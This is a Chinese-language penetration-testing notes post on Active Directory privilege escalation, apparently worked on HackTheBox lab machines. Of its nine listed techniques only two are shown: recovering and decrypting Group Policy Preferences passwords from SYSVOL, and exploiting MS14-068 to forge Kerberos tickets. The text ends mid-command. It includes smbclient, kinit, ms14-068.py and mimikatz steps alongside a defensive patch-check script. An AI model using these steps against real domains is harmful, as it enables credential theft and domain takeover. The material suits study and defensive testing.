# 0x01、前言
菜鸡一枚，标题起的可能有点大，只是个人笔记整理的一个合集（所以基本每个例子都会有实例）。所以虽然说是合集，可能都没有囊括到各位大佬会的一半。还请各位大佬轻喷
# 0x02、目录
  1. GPP和SYSVOL中的密码
  2. MS14-068
  3. DNSAdmins
  4. 不安全的GPO权限
  5. 不安全的ACLs权限
  6. Exchange
  7. LLMNR/NBT-NS 投毒
  8. Kerberoasting
  9. AD recyle Bin
# 0x03、 GPP和SYSVOL中的密码
什么是GPP:  
GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途  
一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。  
该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）  
这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）
漏洞利用：  
接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，位于格式类似于以下的文件夹中：
    \\active.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
## 0x03.1、定位域控制器
    set l   
    nltest /DSGETDC:
    echo %logonserver%
    net time /domain
    ......
## 0x03.2、查询DC共享目录
使用enumlinux或者smbmap检查共享目录
smbmap -H 10.10.10.100 ###列出目标用户共享列表
    ---- -----------    ADMIN$ NO ACCESS
    C$ NO ACCESS
    IPC$ NO ACCESS
    NETLOGON NO ACCESS
    Replication READ ONLY
    SYSVOL NO ACCESS
    Users NO ACCESS
## 0x03.3、连接域共享
    smbclient //active.local/Replication -N
smb:
\active.local\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups>
more Groups.xml
##
0x03.4、使用[gpprefdecrypt.py](https://github.com/leonteale/pentestpackage/blob/master/)解密：
    python gpprefdecrypt.py    edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
# 0x04、MS14-068
危害：任意域内用户都可以提权到域控
一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制
## 0x04.1、漏洞成因
在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的
checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC
就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。
什么是PAC（特权帐户证书）：  
PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。  
PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。
## 0x04.2、利用条件
1.域控机器没有打漏洞补丁 补丁号：KB3011780  
2.拥有一台域内机子及其sid
## 0x04.3、漏洞利用漏洞检测 ##：
FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)
    ./FindSMB2UPTime.py 192.168.31.220
    DC is up since: 2013-12-28 22:24:25This DC is vulnerable to MS14-068
获取域控制器补丁状态:Get-DCPatchStatus.ps1
    # This is an example script only.
    import-module activedirectory
    [string]$KBNumber = "KB3011780"
    $DomainControllers = Get-ADDomainController -filter *
    [int]$DomainControllersCount = $DomainControllers.Count
    [int]$PatchedDCCount = 0
    [int]$UnPatchedDCCount = 0
    $UnpatchedDCs = @()
    Write-Output "Scanning $DomainControllersCount Domain Controllers for patch $KBNumber"
    ForEach ($DomainController in $DomainControllers)
    {
        $DomainControllerHostName = $DomainController.HostName
        $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue
        IF ($PatchStatus.InstalledOn)
            {
                $PatchStatusInstalledOn = $PatchStatus.InstalledOn
                Write-Output "$DomainControllerHostName patched on $PatchStatusInstalledOn"
                $PatchedDCCount++
            }
        Else
            {
                Write-Warning "$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)"
                [array]$UnpatchedDCs += $DomainController.HostName
                $UnPatchedDCCount++
            }
    }
    Write-Output "Out of $DomainControllersCount DCs, Patched: $PatchedDCCount & UnPatched: $UnPatchedDCCount "
    IF ($UnpatchedDCs)
    {
        Write-Output "The following DCs are NOT patched for $KBNumber"
        $UnpatchedDCs
    }
## 0x04.4、环境描述：
目标机器：10.10.10.52 Windows Server 2008 R2 Standard  
已获取：DC上的一个普通本地账户  
james用户账户密码  
james sid （可通过多种途径获取 rpclient：lookupnames james 目标机器shell中：  
whoami /all ，）  
攻击机：kali 10.10.14.14 （不在域中）
**在Linux上利用：** (有用户凭据、没有目标shell的情况下)  
1.安装客户端，在客户端生成票证
    sudo apt-get install krb5-user cifs-utils rdate
2.编辑/etc/krb5.conf  
[libdefaults]  
default_realm = HTB.LOCAL
    [realms]
       HTB.LOCAL = {
        kdc = mantis.htb.local:88
        admin_server = mantis.htb.local
        default_domain = HTB.LOCAL
        }
    [domain_realm]
        .domain.internal = HTB.LOCAL
        domain.internal = HTB.LOCAL
3.添加路由：编辑/etc/resolve.conf
nameserver 10.10.10.52
4.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）
[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间  
[方法2]sudo rdate -n 10.10.10.52 ###直接同步到域控时间
5.为james用户生成一张新的Kerberos票证
    kinit -V PI:EMAIL       ###kinit中域名需要大写；或直接  kinit james    
    klist
此时生成的是james的票证：访问C$是没有权限的
    kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -k
    tree connect failed: NT_STATUS_ACCESS_DENIED
6.ms14-068生成高权限TGT票证
7.替换低权限票证mv PI:EMAIL /tmp/krb5cc_1000
8.smb成功登录C$
**Mimikatz利用** ：  
先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令
ms14-068.py -u PI:EMAIL -s
S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis